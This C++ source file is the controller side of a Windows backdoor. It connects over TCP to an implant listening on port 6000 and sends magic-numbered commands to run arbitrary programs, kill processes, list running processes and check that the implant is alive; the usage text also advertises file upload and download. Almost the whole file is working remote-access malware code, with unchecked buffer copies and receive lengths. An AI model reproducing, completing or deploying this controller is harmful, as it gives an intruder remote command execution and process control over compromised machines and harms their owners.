// backdoor_controller.cpp : Defines the entry point for the console application.
//

#define WIN32_LEAN_AND_MEAN

#include "stdafx.h"
#include <windows.h>
#include <winsock2.h>
#include <wchar.h>

#include "backdoor_protocol.h"

#define MAX_STRING_SZ 300
#define RECEIVE_BUFLEN 1024

// Need to link with Ws2_32.lib
#pragma comment(lib, "ws2_32.lib")

//
// Functions
//
int SendHeartCheck(SOCKET client_socket);
int SendTerminateProcess(DWORD pid,
	                     SOCKET client_socket);
int SendProcessExecute(WCHAR* process_path,
	                   SOCKET client_socket);
int SendEnumerateProcess(SOCKET client_socket);


void Usage()
{
		wprintf(L"Usage: backdoor\n"); 

	    wprintf(L"\t[-heart]                              Check if backdoor is up\n"); 
		wprintf(L"\t[-upload]   local_path remote_path    Upload file\n"); 
		wprintf(L"\t[-download] remote_path local_path    Download file\n");
		wprintf(L"\t[-execute]  process_path              Execute process\n");
		wprintf(L"\t[-ps]                                 Enumerate process list\n"); 
		wprintf(L"\t[-kill]     #PID                      Kill this pid\n");
		return;
}

int _tmain(int argc, _TCHAR* argv[])
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;
	SOCKET client_socket = INVALID_SOCKET;
    sockaddr_in sock; 

	if(argc < 2)
	{
		Usage();

		return -1;
	}


    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, 
		             &wsaData);
    if (err != 0) 
	{
		// Check if error = WSAVERNOTSUPPORTED and if is --
		// It means ws2_32.dll is too old.  This system needs a serious update.
        wprintf(L"WSAStartup failed with error: %d\n", err);

        return -1;
    }

	//
	// Create a socket 
	//
	client_socket = socket(AF_INET, 
		                   SOCK_STREAM, 
						   IPPROTO_TCP);
    if (client_socket == INVALID_SOCKET) 
	{
        wprintf(L"Create socket failed. Error: %u\n", WSAGetLastError());

        WSACleanup();

        return -1;
    }

	//
	// Fill in sockaddr_in -- Address family, IP address, port
	//
    sock.sin_family = AF_INET;
    sock.sin_addr.s_addr = inet_addr("127.0.0.1");    //(INADDR_ANY);     //("127.0.0.1");
    sock.sin_port = htons(6000);

	//
	// Connect to server
	//
    err = connect(client_socket, (SOCKADDR *) & sock, sizeof (sock));
    if(err == SOCKET_ERROR) 
	{
        wprintf(L"Connect() failed. Error: %ld\n", WSAGetLastError());

		closesocket(client_socket);
        WSACleanup();

        return -1;
    }

	//
	// Send Command
	//

	if(_wcsicmp(argv[1], L"-heart") == 0)
	{
		SendHeartCheck(client_socket);
	}
	else if(_wcsicmp(argv[1], L"-execute") == 0)
	{
		SendProcessExecute(argv[2],
			               client_socket);
	}
	else if(_wcsicmp(argv[1], L"-kill") == 0)
	{
		SendTerminateProcess(_wtoi(argv[2]),
			                client_socket);
	}
	else if(_wcsicmp(argv[1], L"-ps") == 0)
	{
		SendEnumerateProcess(client_socket);
	}
	else
	{
		wprintf(L"Error: Unkown Command!\n");

		Usage();
	}
	

	//
	// Cleanup
	//

	closesocket(client_socket);
    WSACleanup();

	return 0;
}

int SendTerminateProcess(DWORD pid,
	                     SOCKET client_socket)
{
	BKDOOR_PROCESS_REQ req;
	req.magicNum = BACKDOOR_MAGIC_NUMBER;
	req.cmd = BKDOOR_KILL_PROCESS;
	req.th32ProcessID = pid;

	wprintf(L"Terminating ... %d\n", pid);

	int bytes_sent = send(client_socket,
		                  (const char*)&req,
						  sizeof(req),
						  0);
	if(bytes_sent == SOCKET_ERROR)
	{
		wprintf(L"Send() failed.  Error: %ld\n", WSAGetLastError());

		return -1;
	}
	else
	{
		wprintf(L"Bytes sent: %d\n", bytes_sent);
	}

	//
	// Receive ACK
	//
	char recvbuf[RECEIVE_BUFLEN];

    int bytes_received = recv(client_socket, 
		                      recvbuf, 
							  sizeof(recvbuf),
							  0);
    if ( bytes_received > 0 )
	{
        wprintf(L"Bytes received: %d\n", bytes_received);
	}

	// IMPORTANT:  For future need to check proper receive length

	char* buf_ptr = recvbuf;

	if(*((BACKDOOR_MSG*)buf_ptr) == BKDOOR_ACK)
	{
		wprintf(L"Received ACK: Process Terminated!\n");
	}
	else if(*((BACKDOOR_MSG*)buf_ptr) == BKDOOR_NAK)
	{
		wprintf(L"Received NAK: Process terminate failed!\n");
	}
		
	return 0;
}

int SendEnumerateProcess(SOCKET client_socket)
{
	BKDOOR_PROCESS_REQ req;
	req.magicNum = BACKDOOR_MAGIC_NUMBER;
	req.cmd = BKDOOR_GET_PROCESS_LIST;

	int bytes_sent = send(client_socket,
		                  (const char*)&req,
						  sizeof(req),
						  0);
	if(bytes_sent == SOCKET_ERROR)
	{
		wprintf(L"Send() failed.  Error: %ld\n", WSAGetLastError());

		return -1;
	}
	else
	{
		wprintf(L"Bytes sent: %d\n", bytes_sent);
	}

	//
	// Receive process list
	//
    wprintf(L"PID\t\tName\n");
    wprintf(L"====\t\t=====\n");  

	BOOL done = FALSE;
	while(!done)
	{
		char recvbuf[RECEIVE_BUFLEN];

		int bytes_received = recv(client_socket, 
								  recvbuf, 
								  sizeof(recvbuf),
								  0);
		if(bytes_received > 0)
		{
			// IMPORTANT:  For future need to check proper receive length

			BKDOOR_PROCESS_INFO* buf_ptr = (BKDOOR_PROCESS_INFO*)recvbuf;
	
			if(wcscmp(buf_ptr->szExeFile, L"%done%") == 0)
			{
				done = TRUE;
			}
			else
			{
				wprintf(L"%d\t\t%s\n", buf_ptr->th32ProcessID, buf_ptr->szExeFile);
			}
		}
	}

	return 0;
}

int SendProcessExecute(WCHAR* process_path,
	                   SOCKET client_socket)
{
	BKDOOR_PROCESS_REQ req;
    req.magicNum = BACKDOOR_MAGIC_NUMBER;
    req.cmd = BKDOOR_EXECUTE_PROCESS;
    wcscpy(req.szExeFile, process_path);

    int bytes_sent = send (client_socket, (const char*) &req, sizeof (req), 0);

    if (bytes_sent == SOCKET_ERROR)
    {
        wprintf(L"Send() failed. Error: %ld\n", WSAGetLastError());
        return -1;
    }
    else
    {
        wprintf (L"Bytes sent: %dn", bytes_sent);
    }

	//
	// Receive ACK
	//
	char recvbuf[RECEIVE_BUFLEN];

    int bytes_received = recv(client_socket, 
		                      recvbuf, 
							  sizeof(recvbuf),
							  0);
    if ( bytes_received > 0 )
	{
        wprintf(L"Bytes received: %d\n", bytes_received);
	}

	// IMPORTANT:  For future need to check proper receive length

	char* buf_ptr = recvbuf;

	if(*((BACKDOOR_MSG*)buf_ptr) == BKDOOR_ACK)
	{
		wprintf(L"Received ACK: Process Executes!\n");
	}
	else if(*((BACKDOOR_MSG*)buf_ptr) == BKDOOR_NAK)
	{
		wprintf(L"Received NAK: Process execute failed!\n");
	}
		
	return 0;
}

int SendHeartCheck(SOCKET client_socket)
{
	HEARTBEAT_INFO info;
	info.magicNum = BACKDOOR_MAGIC_NUMBER;
	info.msg = BKDOOR_HEARTBEAT;

	int bytes_sent = send(client_socket,
		                  (const char*)&info,
						  sizeof(info),
						  0);
	if(bytes_sent == SOCKET_ERROR)
	{
		wprintf(L"Send() failed.  Error: %ld\n", WSAGetLastError());

		return -1;
	}
	else
	{
		wprintf(L"Bytes sent: %d\n", bytes_sent);
	}

	//
	// Receive ACK
	//
	char recvbuf[RECEIVE_BUFLEN];

    int bytes_received = recv(client_socket, 
		                      recvbuf, 
							  sizeof(recvbuf),
							  0);
    if ( bytes_received > 0 )
	{
        wprintf(L"Bytes received: %d\n", bytes_received);
	}

	// IMPORTANT:  For future need to check proper receive length

	char* buf_ptr = recvbuf;

	if(*((BACKDOOR_MSG*)buf_ptr) == BKDOOR_ACK)
	{
		wprintf(L"Received ACK: Backdoor Alive!\n");
	}

	return 0;
}